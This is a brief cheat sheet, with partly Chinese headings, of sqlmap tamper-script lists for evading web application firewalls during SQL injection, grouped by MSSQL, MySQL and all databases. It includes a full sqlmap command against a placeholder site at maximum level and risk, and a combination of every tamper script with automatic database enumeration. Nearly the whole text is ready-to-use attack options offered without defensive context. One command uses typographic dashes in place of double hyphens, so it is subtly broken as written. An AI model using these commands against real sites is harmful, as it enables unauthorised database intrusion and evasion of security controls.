## tamper

### mssql

```
tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
```

### 所有

```
sqlmap -u ‘http://www.site.com/search.cmd?form_state=1’ — level=5 — risk=3 -p ‘item1’ — tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
```

### mysql

```
--tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
```

```
--tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,percentage,randomcase,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
```

所有

```
--tamper=apostrophemask,0eunion,apostrophenullencode,appendnullbyte,base64encode,between,binary,bluecoat,chardoubleencode,charencode,charunicodeencode,charunicodeescape,commalesslimit,commalessmid,commentbeforeparentheses,concat2concatws,decentities,dunion,equaltolike,equaltorlike,escapequotes,greatest,halfversionedmorekeywords,hex2char,hexentities,htmlencode,if2case,ifnull2casewhenisnull,ifnull2ifisnull,informationschemacomment,least,lowercase,luanginx,misunion,modsecurityversioned,modsecurityzeroversioned,multiplespaces,ord2ascii,overlongutf8,overlongutf8more,percentage,plus2concat,plus2fnconcat,randomcase,randomcomments,schemasplit,scientific,sleep2getlock,space2comment,space2dash,space2hash,space2morecomment,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,substring2leftright,symboliclogical,unionalltounion,unmagicquotes,uppercase,varnish,versionedkeywords,versionedmorekeywords,xforwardedfor --batch --current-db
```

